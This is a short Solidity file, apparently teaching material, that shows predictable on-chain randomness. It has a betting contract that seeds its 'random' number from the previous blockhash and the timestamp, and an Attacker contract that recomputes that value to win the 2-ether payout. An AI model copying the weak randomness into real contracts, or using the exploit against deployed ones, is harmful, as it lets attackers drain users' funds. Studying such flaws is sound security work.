// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

/*
* @dev This contract includes an example of a predictable "random" number generation.
*/

uint constant FEE = 1 ether;

contract Example4 {
    uint256 result;

    function guess(uint256 n) public payable {
        require(msg.value == FEE, "Fee not paid!");
        result = uint256(
            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
        );

        if (result == n) {
            payable(msg.sender).call{value: 2 ether}("");
        } else {
            revert("Failed guess!");
        }
    }
}


contract Attacker {
    uint256 result;
    Example4 victim;

    constructor (address target) {
        victim = Example4(target);
    }

    function exploit() external {      
        result = uint256(
            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
        );

        victim.guess{value: FEE}(result);
    }
}